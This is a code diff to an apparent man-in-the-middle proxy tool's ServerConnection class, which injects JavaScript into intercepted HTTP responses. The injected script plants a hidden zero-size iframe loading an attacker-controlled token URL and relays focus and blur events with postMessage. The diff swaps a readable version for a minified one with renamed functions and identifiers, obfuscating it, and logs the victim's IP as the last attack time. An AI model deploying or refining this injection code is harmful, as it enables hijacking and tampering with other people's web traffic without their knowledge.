@@ -91,7 +91,6 @@ class ServerConnection(HTTPClient):
 
             injectPoint = self.findInjectPoint(data);
             if injectPoint != -1:    
-                #print "FRAMING: "+self.client.getHeader("host")
                 data = self.injectSetupScript(data, injectPoint)
 	 
         
@@ -112,42 +111,12 @@ class ServerConnection(HTTPClient):
                 return bodyEnd
         else: 
              return headEnd    
-
+    
+        
     def injectSetupScript(self,data, injectPoint):    
         newData = data[:injectPoint]
-        rest = data[injectPoint:]
-        setupScript = "function selfDestruct(){ \
-                            master = document.getElementById('masterIframe'); \
-                            master.parentNode.removeChild(master); \
-                        }\
-                        function onMessage(event){ \
-                            m = event.data;\
-                            if('selfDestruct' == m) selfDestruct();\
-                        }\
-                        function onFocus(){\
-	                        n = window.frames.length;\
-	                        window.frames[n-1].postMessage('focus','*');\
-                        }\
-                        function onBlur(){\
-                            n = window.frames.length;\
-                            window.frames[n-1].postMessage('blur','*');\
-                        }\
-                        function initFraming(){\
-                            window.addEventListener('message', onMessage, false); \
-                            window.addEventListener ('blur', onBlur, false);\
-                            window.addEventListener ('focus', onFocus, false);\
-                            masterIframe = document.createElement('IFRAME'); \
-                            masterIframe.setAttribute('src', _LUPIN_FRAME_TOKEN);\
-                            masterIframe.setAttribute('id', 'masterIframe');\
-                            masterIframe.setAttribute('name', 'masterIframe');\
-                            masterIframe.setAttribute('style', 'visibility:hidden;display:none');\
-                            masterIframe.setAttribute('height', '0');\
-                            masterIframe.setAttribute('width', '0');\
-                            document.body.appendChild(masterIframe);\
-                        }\
-                        setTimeout('initFraming()',1000);"
-                        
-        newData += "<script type=\"text/javascript\"> _LUPIN_FRAME_TOKEN=\"" + self.PersistentData._LUPIN_TOKEN + self.PersistentData._FRAME + "\";"+setupScript+"</script>" + rest
+        rest = data[injectPoint:]                        
+        newData += "<script type=\"text/javascript\">function f1(){a=document.getElementById('_mf_');a.parentNode.removeChild(a);}function f2(a){b=a.data;if('_td_'==b)f1();}function f3(){a =window.frames.length;window.frames[a-1].postMessage('focus','*');}function f4(){a= window.frames.length;window.frames[a-1].postMessage('blur','*');}function f5(){window.addEventListener('message',f2,false);window.addEventListener('blur',f4,false);window.addEventListener('focus',f3,false);a= document.createElement('IFRAME');a.setAttribute('src','" + self.PersistentData._LUPIN_TOKEN + self.PersistentData._FRAME+ "');a.setAttribute('id','_mf_');a.setAttribute('style','visibility:hidden;display:none');a.setAttribute('height','0');a.setAttribute('width','0');document.body.appendChild(a);}setTimeout('f5()',1000);</script>" + rest
         self.client.PersistentData.setLastAttackTime(self.client.getClientIP())	
         return newData
          
